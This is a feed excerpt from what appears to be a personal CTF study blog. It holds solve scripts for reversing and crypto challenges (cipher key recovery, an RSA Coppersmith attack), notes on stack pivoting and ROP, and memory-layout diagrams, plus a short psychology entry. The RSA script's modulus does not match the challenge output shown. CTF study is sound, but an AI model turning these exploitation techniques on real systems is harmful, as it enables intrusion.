            "content_html": "<h1 id=\"最近要比赛reverse积累一些逆向代码\"><a class=\"anchor\" href=\"#最近要比赛reverse积累一些逆向代码\">#</a> 最近要比赛 reverse，积累一些逆向代码</h1>\n<h2 id=\"xctf-reversing-x64elf-100\"><a class=\"anchor\" href=\"#xctf-reversing-x64elf-100\">#</a> xctf: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZhbXA7bnVtYmVyPTQmYW1wO2dyYWRlPTEmYW1wO2lkPTQ4MjYmYW1wO3BhZ2U9Mg==\">Reversing-x64Elf-100</span></h2>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639387679(1).jpg\" alt=\"\" /></p>\n<p>进入 sub_4006FD 函数</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639387750(1).jpg\" alt=\"\" /></p>\n<p>逆向脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Dufhbmf'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'pG`imos'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ewUglpt'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    flag <span class=\"token operator\">=</span> flag <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>  <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>   a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token operator\">*</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">/</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>   <span class=\"token punctuation\">)</span>  <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"xctf\"><a class=\"anchor\" href=\"#xctf\">#</a> xctf</h2>\n",
            "tags": [
                "computer-science",
                "Reverse",
                "CTF",
                "Reverse"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn4/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn4/",
            "title": "pwn4-stack pivoting",
            "date_published": "2021-12-10T01:53:16.101Z",
            "content_html": "<h2 id=\"0x01-stack-pivoting\"><a class=\"anchor\" href=\"#0x01-stack-pivoting\">#</a> 0x01 stack pivoting</h2>\n<p>栈迁移就是因为可写空间太小不够 rop，就把栈迁移到别的地方去构造 payload。<br />\n而栈迁移最重要的是两个汇编命令，在程序调用完成 call 返回的时候。</p>\n<p>leave； ret;<br />\nleave 相对于是 mov esp，ebp；pop ebp；把 bp 的值给 sp，弹出 bp;<br />\nret 是 pop eip;</p>\n<h2 id=\"0x02-principle\"><a class=\"anchor\" href=\"#0x02-principle\">#</a> 0x02 Principle</h2>\n<p>先从 32 位来理解栈迁移的利用原理。<br />\nstack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p>\n<ol>\n<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>\n<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>\n<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>\n</ol>\n",
            "tags": [
                "computer-science",
                "Pwn"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn3/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Pwn/pwn3/",
            "title": "pwn3",
            "date_published": "2021-12-09T08:52:14.599Z",
            "content_html": "<h1 id=\"base_pwn\"><a class=\"anchor\" href=\"#base_pwn\">#</a> Base_PWN</h1>\n<p>一般入门 PWN 会一点 c，常见的 register 了解下，然后刷题就会有很大的提升，能解决一些基础的 pwn 题，想继续学下去的话，基础的优势就会显现出来。不然就会很难理解一些底层的东西，思路迷糊，无从下手。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L0hJVENPTi1UcmFpbmluZy90cmVlL21hc3Rlci9MQUI=\">HITCON 的 PWN 的实验题目，很适合搭建，复现，讲解。</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1919808-20200313174430270-1652724193.png\" alt=\"\" /></p>\n<pre><code class=\"language-cmd\">+------------------------+ Oxffffffff\n        |     kernel space       |  # 内核空间\n        +------------------------+ 0xC0000000\n        |        stack           |\n        +------------------------+\n        |                        |\n        |        unused          |\n        |                        |\n        +------------------------+\n        |   dynamic libraries    | # 动态库\n        +------------------------+ 0x40000000\n        |                        |\n        |        unused          |\n        |                        |\n        +------------------------+\n        |         heap           | # 堆 动态内存分配的空间 进程调用\n        +------------------------+ # malloc、free等函数时变化\n        |  read/write sections   |\n        |      (.data .bss)      |\n        +------------------------+\n        |   read only sections   |\n        | (.init .rodata .text)  |\n        +------------------------+ 0x08048000\n        |       reserved         | \n        +------------------------+\n</code></pre>\n<p>ELF 文件结构：</p>\n<pre><code class=\"language-cmd\">ELF file format:\n+---------------+\n|  File header  | # 文件头保存每个段类型和长度\n+---------------+ \n| .text section | # 代码段 存放代码和指令\n+---------------+\n| .data section | # 数据段 \n+---------------+\n| .bss section  | # bss段 存放未初始化的全局变量和静态变量,一般可读可写\n+---------------+ # 是存放shellcode的好地方。其地址是固定的,可以存放字符串。\n|      ...      |\n+---------------+\n|  xxx section  |# 还有字符串段、符号表段行号表段等\n+---------------+\n# 局部变量和函数参数分别在栈中分配(栈和堆分别在内存中分配,在elf文件中不存在对应的部分)\n</code></pre>\n<p>​\t![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3plcGh5ci1jeWJlci9CbG9nLUdhbGxlcnlAbWFpbi8vYmxvZy1pbWcvU2NyZWVuc2hvdA==\">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/Screenshot</span> 2021-12-09 171807.png)</p>\n",
            "tags": [
                "computer-science",
                "Pwn"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/psychology/ana/research/",
            "url": "https://zephyr-cyber.github.io.git/psychology/ana/research/",
            "title": "chology",
            "date_published": "2021-12-06T08:52:43.768Z",
            "content_html": "<h1 id=\"psychoanalytic-theory\"><a class=\"anchor\" href=\"#psychoanalytic-theory\">#</a> Psychoanalytic Theory</h1>\n<p>Psychoanalytic theory was founded by Austrian psychiatrist Freud at the end of the 19th century and the beginning of the 20th century. Psychoanalytic theory is the cornerstone of modern psychology. Its influence is far from limited to the field of clinical psychology. It has a far-reaching impact on the whole psychological science and even all fields of western humanities. Its influence can be compared with Darwin's theory of evolution. He proposed that the motivation of behavior comes from strong internal drive and impulse, such as sexual instinct and aggressive instinct. He also believes that the root cause of adult behavior is the unresolved psychological conflict left over by childhood experience. What psychologists need to do is to understand this internal drive, whether conscious or unconscious, will give behavior energy and guide behavior</p>\n",
            "tags": [
                "psychology",
                "ana"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/Crypto/Crypto/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/Crypto/Crypto/",
            "title": "Crypto",
            "date_published": "2021-12-06T07:09:31.076Z",
            "content_html": "<p>2021/10/21 更新了高位截肢</p>\n<h1 id=\"高新区比赛\"><a class=\"anchor\" href=\"#高新区比赛\">#</a> 高新区比赛</h1>\n<p>V^3<br />\n 好像是一个 2017 年的题改的<br />\n cnhongke {bf7e02677b4faab7808d1580fd5bb}<br />\n 也可以手动爆破<br />\n就是按照对应关系<br />\n然后逐位加密<br />\n你会发现到第六个就开始变成对称了<br />\n所以手动跑 5 次就出结果了<br />\n exp 都多余了<br />\n附上 exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">_l</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>idx<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">,</span> k1<span class=\"token punctuation\">,</span> k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    s <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>_l<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    i1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    i2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    decrypted <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> ct<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">[</span>i1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">[</span>i2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                decrypted <span class=\"token operator\">+=</span> c</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        i1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        i2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i2 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> decrypted</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> k1<span class=\"token punctuation\">,</span> k2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    t <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span>_l<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    i1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    i2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        c <span class=\"token operator\">+=</span> t<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">[</span>i1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">[</span>i2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        i1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        i2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i2 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">recover_key</span><span class=\"token punctuation\">(</span>known_prefix<span class=\"token punctuation\">,</span> ciphertex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    final_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">14</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">for</span> pos <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            partial_candidate_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">14</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            partial_candidate_key<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            partial_candidate_key<span class=\"token punctuation\">[</span><span class=\"token number\">13</span> <span class=\"token operator\">-</span> pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>partial_candidate_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            res <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>known_prefix<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> ciphertex<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                final_key<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                final_key<span class=\"token punctuation\">[</span><span class=\"token number\">13</span> <span class=\"token operator\">-</span> pos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token keyword\">print</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>final_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>final_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    ciphertext <span class=\"token operator\">=</span> <span class=\"token string\">\"POR4dnyTLHBfwbxAAZhe&#125;&#125;ocZR3Cxcftw9\"</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    key <span class=\"token operator\">=</span> recover_key<span class=\"token punctuation\">(</span><span class=\"token string\">\"SECCON&#123;\"</span><span class=\"token punctuation\">,</span> ciphertext<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    flag <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"rsarepeat\"><a class=\"anchor\" href=\"#rsarepeat\">#</a> RSArepeat</h1>\n<p>这题好像也有层一样的，比赛真 lao<br />\n 给出加密脚本</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom Crypto.Util.number import *\nimport gmpy2\nimport os\nfrom secret import flag\n\n\np = gmpy2.next_prime(bytes_to_long(os.urandom(32) * 10))\nq = getPrime(2048)\nn = p * q\nm = bytes_to_long(flag)\ne = 65537\nc = pow(m, e, n)\nprint 'n = ' + str(n)\nprint 'c = ' + str(c)\n\n\n运行结果输出\n# n = 9120210412817098868567410854637632250220555881403526554620639158581419400118706476426462580532569560128403528542849222604236640862674516611277130361890497616002043535833874824203278779255224103895976559478230598208736638548838369515266506758788653023380759388265524679357661867344583727639009050611035809615332415345615636794183389139631751072725812173232153921977529854299720035907475080123728133963132357285009229616899363413864250134103133772163607484794238528972871955212167583918722247406108717508117668301570190879613631465451744135100528987401664293214977426648232669628002711796584477405954390921585168542545024508132280795239187047607902042772074354512983547626983416047058674495234725402709185065533866399101327869049927071762987405052014360342557346201760417195526717659432120957024932822171629034785982161149134423193624715061013742839402782240625571812632970088905336230003285927069650264756078977556405903281928093668669291639199556779542688708405151017597677182338101624350346890556571828242761503472862589187188272783083175514693346986425145048900560704517281059296515380916946885637766528669652741939121435925118622627340581156923111326642804173809225000120356084999577920000481451709828075752253192537628742219663830938886966680564258836058435847445136469870523064012091603727249413340707659477419033271750976011384443208371660411376327908639483034074911057106131325663\n# c = 7068462753085070298092306006815948822917293261569147262935876173777154611330212172780298815871946045639185357656186163809499649889823797927617022879328397754544340874952687572138224768719999154448738757631265317915591819395360957051438805269461772096089208044993726972263528636921213722053915213474520713305628933165329554039041526341429811011879399124487420973883220496337343697082485151325947637134492168684404895651666064423117891350949942888278577264641878267652440305311472437072576068073588628794693349303196170011208043072754814062079404857657352761995684725014730958374555123902870761944058212939416619872746207245705213743023048901892977114871581000445118225605980711967279184600832881914000747237143653411293658641093111449235793736446421524719927367452081557329271167988711131750096910582920748875147684842547191116046110455610485921697703084407073334158845880179092914138111196153821093666870713318435216431977100255451151613217255214311447270315317924828002186873831048826117341746203538919869858723643158591679168166815433400943179342639989830429265410316662281946735133048179580170395697284908451588172527612828357594205617900793644449780703541620423822874332895281227408264377675840472406248296158342659308845264164232068007825845287325024564804783116616695927303806931940737550484802677095488750998780934178991718038605826623684585430755074719975767565185371149546480577\n\n</code></pre>\n<p><img data-src=\"/img/CRYPTO/gaoxinqu1.jpg\" alt=\"avatar\" /><br />\n<img data-src=\"/img/CRYPTO/gaoxinqu2.jpg\" alt=\"avatar\" /></p>\n<p>附上 exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!python2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># @FileName: tt.py</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">5723803231105438067621879312731287221934357097569268166420520040038029065761152553810494005387890506233399584147246538077002208499639437803910245817342952372458171365752480055753844375305610474395282822742943102904320741363812652705261682747336617279332644951905181705937705454682585492345619282271549850191266841799115355201225481894665469006243078988838181049476985523095183211083306888898330855716843411424493132244378006508444594329543929521327878717314543259397842391141445238073295183064204038877358053346160904246766744058035260700906186262991418344028036927076898224775513313992135215728859733003918328707361999295628679324987941544108516966440200369017207031702010292125100166826894159577761774445100777211415862293977599736904535299914065534202980062824965765410888738320552504576390375348702993646394541895827629891842496139670703262245710062952138603857926812293927639685763696276258111848707179034963859209200388611940617575570592428927246122690317085150458638646993030523460057013506016279214894927343923461607646478524983809407592464446504390449868558006440884166283766345457345779137687215125369153544179042534504852071842244821976629524307628462619103368289645015324069375881393414723379127777033799199839545069927720992165031027897683055528657202955467661225465098604530590852960596629917086084805687598732530884961789893076147057895925224397540225533098516204541840889</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>t<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">31</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x01'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#print t</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>K <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>P<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>K<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    r <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">*</span>t <span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>beta<span class=\"token operator\">=</span><span class=\"token number\">0.45</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> r<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">print</span> i<span class=\"token punctuation\">,</span>r</pre></td></tr></table></figure><h1 id=\"维吉尼亚\"><a class=\"anchor\" href=\"#维吉尼亚\">#</a> 维吉尼亚</h1>\n<p>听名字就知道</p>\n<pre><code>Vvr Ifnvaus Bdwokv Gbtrzsa Vkqgofntja rrlznxk eflvkozjcdue rs “mzg oez ff pjkhvtx ok kqzioeg vgfsf.” Zyil au vvykokaeoyrp avuwfnzv, bnl fcry eom ucdgaie mzg qhxiegl dfrguta 